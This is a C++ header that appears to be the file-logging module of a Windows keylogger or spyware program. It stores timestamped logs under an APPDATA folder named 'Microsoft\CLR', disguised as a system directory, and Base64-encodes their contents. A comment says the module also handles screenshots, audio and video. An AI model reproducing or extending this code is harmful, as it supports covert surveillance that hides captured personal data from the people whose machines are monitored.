#ifndef  IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "HelperHeaders.h"
#include "Base64.h"
//InputOutput.h will handle the input/output to the log file and screen shots audio videos etc.
namespace IO
{
    //Giving the path C:\Username\AppData\Roaming
    std::string GetOurPath(const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full=appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : ""); //full is a variable depicting path where the log file is being stored and \\ is because \ needs to be inserted in the path
    }
    //function for making the directory
    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS; //Either the CreateDirectory function creates the directory or the directory already exists
    } //Due to double \\ this function might not be able to get the entire path of a pile sometimes so let's create a backup function

    bool MKDir(std::string path)
    {
        //this for-loop is using a char pointer to go through the string
        for(char &c : path)
        {
            if(c == '\\') //if we encounter \ then c condition
            {
                c = '\0';
                if(!MkOneDr(path))
                {
                    return false;
                }
                c='\\';
            }
        }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";
        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t <<std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file<<data;
            if(!file)
            {
                return "";
            }
            file.close();
            return name; //Return the name of the file
        }
        catch(...)
        {
            return "";
        }
    }

}

#endif // IO_H
